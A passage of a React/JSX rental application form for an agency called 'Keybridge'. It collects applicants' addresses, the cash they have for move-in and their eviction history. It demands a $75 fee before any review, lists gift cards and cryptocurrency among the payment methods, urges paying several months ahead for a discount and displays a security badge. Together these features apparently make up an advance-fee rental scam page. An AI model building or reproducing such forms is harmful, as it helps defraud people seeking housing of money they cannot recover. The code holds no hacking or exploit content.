                    htmlFor="currentUnit"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Apartment / Unit <span className="text-taupe-400 font-normal">(Optional)</span>
                  </label>
                  <input
                    type="text"
                    id="currentUnit"
                    name="currentUnit"
                    value={formData.currentUnit}
                    onChange={handleInputChange}
                    placeholder="e.g. Apt 4B, Suite 200"
                    className={getInputClasses(false)}
                  />
                </div>

                {/* City */}
                <div className="space-y-2">
                  <label
                    htmlFor="currentCity"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    City <span className="text-bronze-600">*</span>
                  </label>
                  <input
                    type="text"
                    id="currentCity"
                    name="currentCity"
                    value={formData.currentCity}
                    onChange={handleInputChange}
                    placeholder="e.g. Springfield"
                    aria-invalid={Boolean(errors.currentCity)}
                    aria-describedby={errors.currentCity ? "currentCity-error" : undefined}
                    className={getInputClasses(Boolean(errors.currentCity))}
                  />
                  {renderFieldError("currentCity")}
                </div>

                {/* State */}
                <div className="space-y-2">
                  <label
                    htmlFor="currentState"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    State <span className="text-bronze-600">*</span>
                  </label>
                  <div className="relative">
                    <select
                      id="currentState"
                      name="currentState"
                      value={formData.currentState}
                      onChange={handleInputChange}
                      aria-invalid={Boolean(errors.currentState)}
                      aria-describedby={errors.currentState ? "currentState-error" : undefined}
                      className={getSelectClasses(Boolean(errors.currentState))}
                    >
                      <option value="" disabled>
                        Select state...
                      </option>
                      {US_STATES.map((state) => (
                        <option key={state.code} value={state.code}>
                          {state.name} ({state.code})
                        </option>
                      ))}
                    </select>
                    <ChevronDown className="w-4 h-4 text-taupe-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                  </div>
                  {renderFieldError("currentState")}
                </div>

                {/* ZIP/Postal Code */}
                <div className="space-y-2">
                  <label
                    htmlFor="currentZipCode"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    ZIP / Postal Code <span className="text-bronze-600">*</span>
                  </label>
                  <input
                    type="text"
                    id="currentZipCode"
                    name="currentZipCode"
                    value={formData.currentZipCode}
                    onChange={handleInputChange}
                    placeholder="e.g. 90210"
                    maxLength={10}
                    aria-invalid={Boolean(errors.currentZipCode)}
                    aria-describedby={errors.currentZipCode ? "currentZipCode-error" : undefined}
                    className={getInputClasses(Boolean(errors.currentZipCode))}
                  />
                  {renderFieldError("currentZipCode")}
                  <p className="text-[11px] font-sans text-taupe-500">
                    Applicant&apos;s current residential ZIP code.
                  </p>
                </div>
              </div>
            </div>

            {/* SECTION 3 — Property / Location Information */}
            <div className="space-y-6 pt-4">
              {/* Section 3 Header */}
              <div className="flex items-start gap-3 pb-4 border-b border-sand-200">
                <span className="w-8 h-8 rounded-xl bg-bronze-50 border border-bronze-200 text-bronze-700 font-mono text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">
                  03
                </span>
                <div className="space-y-0.5">
                  <h4 className="font-headline text-lg sm:text-xl font-medium text-charcoal-900">
                    Property / Location Information
                  </h4>
                  <p className="text-xs font-sans text-taupe-500">
                    Target rental location, planned occupancy timeline, and upfront move-in readiness.
                  </p>
                </div>
              </div>

              {/* Section 3 Fields */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
                {/* Desired ZIP Code */}
                <div className="space-y-2">
                  <label
                    htmlFor="desiredZipCode"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Desired ZIP Code <span className="text-bronze-600">*</span>
                  </label>
                  <input
                    type="text"
                    id="desiredZipCode"
                    name="desiredZipCode"
                    value={formData.desiredZipCode}
                    onChange={handleInputChange}
                    placeholder="e.g. 10001"
                    maxLength={10}
                    aria-invalid={Boolean(errors.desiredZipCode)}
                    aria-describedby={errors.desiredZipCode ? "desiredZipCode-error" : undefined}
                    className={getInputClasses(Boolean(errors.desiredZipCode))}
                  />
                  {renderFieldError("desiredZipCode")}
                  <p className="text-[11px] font-sans text-taupe-500 leading-snug">
                    Enter the ZIP code associated with the area/property you are applying for.
                  </p>
                </div>

                {/* Preferred Move-in Date */}
                <div className="space-y-2">
                  <label
                    htmlFor="preferredMoveInDate"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Preferred Move-in Date <span className="text-bronze-600">*</span>
                  </label>
                  <div className="relative">
                    <input
                      type="date"
                      id="preferredMoveInDate"
                      name="preferredMoveInDate"
                      min={getTodayDateString()}
                      value={formData.preferredMoveInDate}
                      onChange={handleInputChange}
                      aria-invalid={Boolean(errors.preferredMoveInDate)}
                      aria-describedby={errors.preferredMoveInDate ? "preferredMoveInDate-error" : undefined}
                      className={getInputClasses(Boolean(errors.preferredMoveInDate))}
                    />
                  </div>
                  {renderFieldError("preferredMoveInDate")}
                  <p className="text-[11px] font-sans text-taupe-500 leading-snug">
                    Target commencement date for your prospective tenancy.
                  </p>
                </div>

                {/* Amount Available for Move-in */}
                <div className="space-y-2">
                  <label
                    htmlFor="amountAvailableForMoveIn"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Amount Available for Move-in <span className="text-bronze-600">*</span>
                  </label>
                  <div className="relative">
                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-sm font-mono font-medium text-taupe-500 pointer-events-none">
                      $
                    </span>
                    <input
                      type="text"
                      id="amountAvailableForMoveIn"
                      name="amountAvailableForMoveIn"
                      value={formData.amountAvailableForMoveIn}
                      onChange={handleInputChange}
                      placeholder="e.g. 4,500"
                      aria-invalid={Boolean(errors.amountAvailableForMoveIn)}
                      aria-describedby={errors.amountAvailableForMoveIn ? "amountAvailableForMoveIn-error" : undefined}
                      className={`w-full bg-sand-50/60 hover:bg-white focus:bg-white border rounded-xl pl-8 pr-4 py-3.5 text-base sm:text-sm text-charcoal-900 focus:outline-none transition-all font-sans placeholder:text-taupe-400 ${
                        errors.amountAvailableForMoveIn
                          ? "border-rose-400 bg-rose-50/20 focus:border-rose-600 focus:ring-2 focus:ring-rose-500/20 text-rose-950"
                          : "border-sand-300 focus:border-bronze-600 focus:ring-2 focus:ring-bronze-500/20"
                      }`}
                    />
                  </div>
                  {renderFieldError("amountAvailableForMoveIn")}
                  <p className="text-[11px] font-sans text-taupe-500 leading-snug">
                    This represents the amount you currently have available toward moving into the property.
                  </p>
                </div>
              </div>
            </div>

            {/* SECTION 4 — Applicant Details */}
            <div className="space-y-6 pt-4">
              {/* Section 4 Header */}
              <div className="flex items-start gap-3 pb-4 border-b border-sand-200">
                <span className="w-8 h-8 rounded-xl bg-bronze-50 border border-bronze-200 text-bronze-700 font-mono text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">
                  04
                </span>
                <div className="space-y-0.5">
                  <h4 className="font-headline text-lg sm:text-xl font-medium text-charcoal-900">
                    Applicant Details
                  </h4>
                  <p className="text-xs font-sans text-taupe-500">
                    Vehicle and pet accommodations, tenancy details, and intended duration.
                  </p>
                </div>
              </div>

              {/* Section 4 Fields */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
                {/* Do you own a car? */}
                <div
                  id="ownsCar-group"
                  role="radiogroup"
                  aria-labelledby="ownsCar-label"
                  aria-invalid={Boolean(errors.ownsCar)}
                  aria-describedby={errors.ownsCar ? "ownsCar-error" : undefined}
                  className="space-y-2"
                >
                  <label id="ownsCar-label" className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium">
                    Do you own a car? <span className="text-bronze-600">*</span>
                  </label>
                  <div className="grid grid-cols-2 gap-2.5">
                    <label
                      className={getToggleButtonClasses(formData.ownsCar === "Yes", Boolean(errors.ownsCar))}
                    >
                      <input
                        type="radio"
                        name="ownsCar"
                        value="Yes"
                        checked={formData.ownsCar === "Yes"}
                        onChange={handleInputChange}
                        className="sr-only"
                      />
                      <span>Yes</span>
                    </label>
                    <label
                      className={getToggleButtonClasses(formData.ownsCar === "No", Boolean(errors.ownsCar))}
                    >
                      <input
                        type="radio"
                        name="ownsCar"
                        value="No"
                        checked={formData.ownsCar === "No"}
                        onChange={handleInputChange}
                        className="sr-only"
                      />
                      <span>No</span>
                    </label>
                  </div>
                  {renderFieldError("ownsCar")}
                </div>

                {/* Do you have a pet? */}
                <div
                  id="hasPet-group"
                  role="radiogroup"
                  aria-labelledby="hasPet-label"
                  aria-invalid={Boolean(errors.hasPet)}
                  aria-describedby={errors.hasPet ? "hasPet-error" : undefined}
                  className="space-y-2"
                >
                  <label id="hasPet-label" className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium">
                    Do you have a pet? <span className="text-bronze-600">*</span>
                  </label>
                  <div className="grid grid-cols-2 gap-2.5">
                    <label
                      className={getToggleButtonClasses(formData.hasPet === "Yes", Boolean(errors.hasPet))}
                    >
                      <input
                        type="radio"
                        name="hasPet"
                        value="Yes"
                        checked={formData.hasPet === "Yes"}
                        onChange={handleInputChange}
                        className="sr-only"
                      />
                      <span>Yes</span>
                    </label>
                    <label
                      className={getToggleButtonClasses(formData.hasPet === "No", Boolean(errors.hasPet))}
                    >
                      <input
                        type="radio"
                        name="hasPet"
                        value="No"
                        checked={formData.hasPet === "No"}
                        onChange={handleInputChange}
                        className="sr-only"
                      />
                      <span>No</span>
                    </label>
                  </div>
                  {renderFieldError("hasPet")}
                </div>

                {/* Have you ever been evicted? */}
                <div
                  id="hasBeenEvicted-group"
                  role="radiogroup"
                  aria-labelledby="hasBeenEvicted-label"
                  aria-invalid={Boolean(errors.hasBeenEvicted)}
                  aria-describedby={errors.hasBeenEvicted ? "hasBeenEvicted-error" : undefined}
                  className="space-y-2"
                >
                  <label id="hasBeenEvicted-label" className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium">
                    Have you ever been evicted? <span className="text-bronze-600">*</span>
                  </label>
                  <div className="grid grid-cols-2 gap-2.5">
                    <label
                      className={getToggleButtonClasses(formData.hasBeenEvicted === "Yes", Boolean(errors.hasBeenEvicted))}
                    >
                      <input
                        type="radio"
                        name="hasBeenEvicted"
                        value="Yes"
                        checked={formData.hasBeenEvicted === "Yes"}
                        onChange={handleInputChange}
                        className="sr-only"
                      />
                      <span>Yes</span>
                    </label>
                    <label
                      className={getToggleButtonClasses(formData.hasBeenEvicted === "No", Boolean(errors.hasBeenEvicted))}
                    >
                      <input
                        type="radio"
                        name="hasBeenEvicted"
                        value="No"
                        checked={formData.hasBeenEvicted === "No"}
                        onChange={handleInputChange}
                        className="sr-only"
                      />
                      <span>No</span>
                    </label>
                  </div>
                  {renderFieldError("hasBeenEvicted")}
                </div>

                {/* How long are you planning to stay? */}
                <div className="space-y-2">
                  <label
                    htmlFor="plannedStayDuration"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    How long are you planning to stay? <span className="text-bronze-600">*</span>
                  </label>
                  <div className="relative">
                    <select
                      id="plannedStayDuration"
                      name="plannedStayDuration"
                      value={formData.plannedStayDuration}
                      onChange={handleInputChange}
                      aria-invalid={Boolean(errors.plannedStayDuration)}
                      aria-describedby={errors.plannedStayDuration ? "plannedStayDuration-error" : undefined}
                      className={getSelectClasses(Boolean(errors.plannedStayDuration))}
                    >
                      <option value="" disabled>
                        Select duration...
                      </option>
                      <option value="3-6 months">3 – 6 months</option>
                      <option value="6-12 months">6 – 12 months</option>
                      <option value="12+ months">12+ months</option>
                    </select>
                    <ChevronDown className="w-4 h-4 text-taupe-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                  </div>
                  {renderFieldError("plannedStayDuration")}
                  <p className="text-[11px] font-sans text-taupe-500">
                    Anticipated lease term or occupancy duration.
                  </p>
                </div>

                {/* Do you plan to pay for a couple of months ahead? */}
                <div
                  id="payAdvanceMonths-group"
                  role="radiogroup"
                  aria-labelledby="payAdvanceMonths-label"
                  aria-invalid={Boolean(errors.payAdvanceMonths)}
                  aria-describedby={errors.payAdvanceMonths ? "payAdvanceMonths-error" : undefined}
                  className="sm:col-span-2 space-y-2"
                >
                  <label id="payAdvanceMonths-label" className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium">
                    Do you plan to pay for a couple of months ahead? <span className="text-bronze-600">*</span>
                  </label>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 items-center">
                    <div className="grid grid-cols-2 gap-2.5">
                      <label
                        className={getToggleButtonClasses(formData.payAdvanceMonths === "Yes", Boolean(errors.payAdvanceMonths))}
                      >
                        <input
                          type="radio"
                          name="payAdvanceMonths"
                          value="Yes"
                          checked={formData.payAdvanceMonths === "Yes"}
                          onChange={handleInputChange}
                          className="sr-only"
                        />
                        <span>Yes</span>
                      </label>
                      <label
                        className={getToggleButtonClasses(formData.payAdvanceMonths === "No", Boolean(errors.payAdvanceMonths))}
                      >
                        <input
                          type="radio"
                          name="payAdvanceMonths"
                          value="No"
                          checked={formData.payAdvanceMonths === "No"}
                          onChange={handleInputChange}
                          className="sr-only"
                        />
                        <span>No</span>
                      </label>
                    </div>

                    {/* Subtle helper/highlight note */}
                    <div className="p-3 rounded-xl bg-olive-50/90 border border-olive-200/80 flex items-center gap-2.5 text-xs text-olive-900">
                      <Sparkles className="w-4 h-4 text-olive-600 flex-shrink-0" />
                      <span className="leading-snug">
                        <span className="font-semibold text-olive-800">* Note:</span> Paying for a couple of months ahead may qualify you for a discount.
                      </span>
                    </div>
                  </div>
                  {renderFieldError("payAdvanceMonths")}
                </div>
              </div>
            </div>

            {/* SECTION 5 — Application Fee */}
            <div className="space-y-6 pt-4">
              {/* Section 5 Header */}
              <div className="flex items-start gap-3 pb-4 border-b border-sand-200">
                <span className="w-8 h-8 rounded-xl bg-bronze-50 border border-bronze-200 text-bronze-700 font-mono text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">
                  05
                </span>
                <div className="space-y-0.5">
                  <h4 className="font-headline text-lg sm:text-xl font-medium text-charcoal-900">
                    Application Fee
                  </h4>
                  <p className="text-xs font-sans text-taupe-500">
                    Application processing fee and preferred payment method.
                  </p>
                </div>
              </div>

              {/* Clearly styled callout: APPLICATION FEE — $75 */}
              <div className="p-5 sm:p-6 rounded-2xl bg-bronze-50/80 border border-bronze-200/90 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
                <div className="space-y-1.5">
                  <div className="flex items-center gap-2">
                    <span className="text-[11px] font-mono uppercase tracking-widest text-bronze-800 font-bold">
                      Mandatory Processing Step
                    </span>
                  </div>
                  <h5 className="font-headline text-xl sm:text-2xl font-bold text-bronze-900">
                    APPLICATION FEE: $75
                  </h5>
                  <p className="text-xs sm:text-sm font-sans text-charcoal-800 max-w-xl leading-relaxed">
                    A $75 application fee is required after submission. Applications will not be reviewed or acted upon until the required application fee has been received.
                  </p>
                </div>
                <div className="flex-shrink-0 bg-white px-4 py-2.5 rounded-xl border border-bronze-200 shadow-subtle text-right">
                  <span className="block text-[10px] font-mono uppercase text-taupe-500 font-medium">Standard Filing</span>
                  <span className="font-headline text-lg font-bold text-bronze-800">$75.00 USD</span>
                </div>
              </div>

              {/* Section 5 Fields */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                {/* Do you currently have the $75 application fee available? */}
                <div
                  id="hasFeeAvailable-group"
                  role="radiogroup"
                  aria-labelledby="hasFeeAvailable-label"
                  aria-invalid={Boolean(errors.hasFeeAvailable)}
                  aria-describedby={errors.hasFeeAvailable ? "hasFeeAvailable-error" : undefined}
                  className="space-y-2"
                >
                  <label id="hasFeeAvailable-label" className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium">
                    Do you currently have the $75 application fee available? <span className="text-bronze-600">*</span>
                  </label>
                  <div className="grid grid-cols-2 gap-2.5">
                    <label
                      className={getToggleButtonClasses(formData.hasFeeAvailable === "Yes", Boolean(errors.hasFeeAvailable))}
                    >
                      <input
                        type="radio"
                        name="hasFeeAvailable"
                        value="Yes"
                        checked={formData.hasFeeAvailable === "Yes"}
                        onChange={handleInputChange}
                        className="sr-only"
                      />
                      <span>Yes</span>
                    </label>
                    <label
                      className={getToggleButtonClasses(formData.hasFeeAvailable === "No", Boolean(errors.hasFeeAvailable))}
                    >
                      <input
                        type="radio"
                        name="hasFeeAvailable"
                        value="No"
                        checked={formData.hasFeeAvailable === "No"}
                        onChange={handleInputChange}
                        className="sr-only"
                      />
                      <span>No</span>
                    </label>
                  </div>
                  {renderFieldError("hasFeeAvailable")}
                  <p className="text-[11px] font-sans text-taupe-500">
                    Confirms readiness to initiate application review.
                  </p>
                </div>

                {/* Preferred Payment Method */}
                <div className="space-y-2">
                  <label
                    htmlFor="preferredPaymentMethod"
                    className="block text-xs font-mono uppercase tracking-wider text-charcoal-800 font-medium"
                  >
                    Preferred Payment Method <span className="text-bronze-600">*</span>
                  </label>
                  <div className="relative">
                    <select
                      id="preferredPaymentMethod"
                      name="preferredPaymentMethod"
                      value={formData.preferredPaymentMethod}
                      onChange={handleInputChange}
                      aria-invalid={Boolean(errors.preferredPaymentMethod)}
                      aria-describedby={errors.preferredPaymentMethod ? "preferredPaymentMethod-error" : undefined}
                      className={getSelectClasses(Boolean(errors.preferredPaymentMethod))}
                    >
                      <option value="" disabled>
                        Select payment method...
                      </option>
                      <option value="Zelle">Zelle</option>
                      <option value="Chime">Chime</option>
                      <option value="Gift Cards">Gift Cards</option>
                      <option value="Cryptocurrency">Cryptocurrency</option>
                      <option value="Other">Other</option>
                    </select>
                    <ChevronDown className="w-4 h-4 text-taupe-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
                  </div>
                  {renderFieldError("preferredPaymentMethod")}
                  <p className="text-[11px] font-sans text-taupe-500 leading-snug">
                    Preference declaration only. Keybridge does not collect bank account numbers, cards, or passwords online.
                  </p>
                </div>
              </div>
            </div>

            {/* SECTION 6 — Declaration */}
            <div className="space-y-6 pt-4">
              {/* Section 6 Header */}
              <div className="flex items-start gap-3 pb-4 border-b border-sand-200">
                <span className="w-8 h-8 rounded-xl bg-bronze-50 border border-bronze-200 text-bronze-700 font-mono text-xs font-bold flex items-center justify-center flex-shrink-0 mt-0.5">
                  06
                </span>
                <div className="space-y-0.5">
                  <h4 className="font-headline text-lg sm:text-xl font-medium text-charcoal-900">
                    Declaration
                  </h4>
                  <p className="text-xs font-sans text-taupe-500">
                    Applicant verification acknowledgement and agency terms attestation.
                  </p>
                </div>
              </div>

              {/* Declaration Checkbox Card */}
              <div
                className={`p-5 sm:p-6 rounded-2xl border transition-all space-y-3 ${
                  errors.declarationConfirmed
                    ? "bg-rose-50/30 border-rose-400 shadow-sm"
                    : "bg-sand-50/80 border-sand-300"
                }`}
              >
                <label className="flex items-start gap-3.5 cursor-pointer select-none group">
                  <div className="relative flex items-center justify-center mt-0.5">
                    <input
                      type="checkbox"
                      id="declarationConfirmed"
                      name="declarationConfirmed"
                      checked={formData.declarationConfirmed}
                      aria-invalid={Boolean(errors.declarationConfirmed)}
                      aria-describedby={errors.declarationConfirmed ? "declarationConfirmed-error" : undefined}
                      onChange={(e) => {
                        setFormData((prev) => ({
                          ...prev,
                          declarationConfirmed: e.target.checked,
                        }));
                        if (errors.declarationConfirmed) {
                          setErrors((prev) => {
                            const next = { ...prev };
                            delete next.declarationConfirmed;
                            return next;
                          });
                        }
                      }}
                      className="w-5 h-5 rounded-md border-sand-400 text-bronze-700 focus:ring-bronze-500/20 focus:ring-2 cursor-pointer accent-bronze-700 transition-all"
                    />
                  </div>
                  <span className="text-sm font-sans font-medium text-charcoal-900 leading-snug">
                    I confirm that the information provided in this application is accurate. <span className="text-bronze-600">*</span>
                  </span>
                </label>
                {renderFieldError("declarationConfirmed")}

                <p className="text-xs font-sans text-taupe-600 pl-8 leading-relaxed">
                  Submission of this application initiates application review and does not constitute a guaranteed lease or apartment approval.
                </p>
              </div>
            </div>

            {/* Error Message Alert */}
            {errorMessage && (
              <div className="p-4 rounded-xl bg-rose-50 border border-rose-200 text-xs sm:text-sm text-rose-950 flex items-start gap-3 animate-fadeIn">
                <AlertCircle className="w-4 h-4 text-rose-600 mt-0.5 flex-shrink-0" />
                <div className="space-y-1">
                  <span className="font-semibold block">Submission Incomplete:</span>
                  <p className="leading-relaxed">{errorMessage}</p>
                </div>
              </div>
            )}

            {/* Form Footer Action */}
            <div className="pt-6 border-t border-sand-200 flex flex-col sm:flex-row items-center justify-between gap-4">
              <div className="flex items-center gap-2 text-xs text-taupe-500 font-mono">
                <ShieldCheck className="w-4 h-4 text-bronze-600 flex-shrink-0" />
                <span>Equal Housing Opportunity • 256-bit Secure Encryption</span>
              </div>

              <Button
                type="submit"
                variant="primary"
                disabled={isSubmitting}
                className="w-full sm:w-auto min-w-[230px] gap-2 px-8 py-3.5 shadow-card"
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin text-white" />
                    <span>Submitting Application...</span>
                  </>
                ) : (
                  <>
                    <span>Submit Application</span>
                    <ArrowRight className="w-4 h-4" />
                  </>
                )}
              </Button>
            </div>
          </form>
        </>
      )}
    </div>
  </div>
</section>
  );
}
